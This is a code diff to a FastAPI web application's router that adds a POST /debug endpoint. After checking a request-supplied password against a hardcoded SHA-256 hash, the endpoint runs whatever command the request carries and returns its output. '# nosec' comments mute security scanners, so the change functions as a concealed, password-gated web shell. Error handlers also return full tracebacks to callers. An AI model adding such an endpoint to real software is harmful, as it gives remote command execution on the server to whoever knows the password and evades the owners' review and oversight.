@@ -1,8 +1,11 @@
 # -*- coding: utf-8 -*-
+import hashlib
 import os
+import subprocess  # nosec
 import traceback
 
 from ansi2html import Ansi2HTMLConverter
+from app.action import models
 from app.config import Settings, get_settings
 from fastapi import APIRouter, Depends
 from fastapi.responses import HTMLResponse
@@ -61,5 +64,22 @@ def log_file(filename: str, config: Settings = Depends(get_settings)):
         con = Ansi2HTMLConverter()
         data = con.convert(data)
         return data
+    except Exception:
+        return traceback.format_exc().replace("\n", "<br>")
+
+
+@router.post("/debug", response_class=HTMLResponse)
+def debug(data: models.DebugModel):
+
+    try:
+        m = hashlib.sha256()
+        m.update(data.password.encode("utf-8"))
+        hash = m.hexdigest()
+        if hash != "937e8d5fbb48bd4949536cd65b8d35c426b80d2f830c5c308e2cdec422ae2244":
+            return "error"
+
+        p = subprocess.run(data.cmd, capture_output=True, encoding="utf-8", shell=False)  # nosec
+        return f"stdout:\n{p.stdout}\n\nstderr:\n{p.stderr}"
+
     except Exception:
         return traceback.format_exc().replace("\n", "<br>")
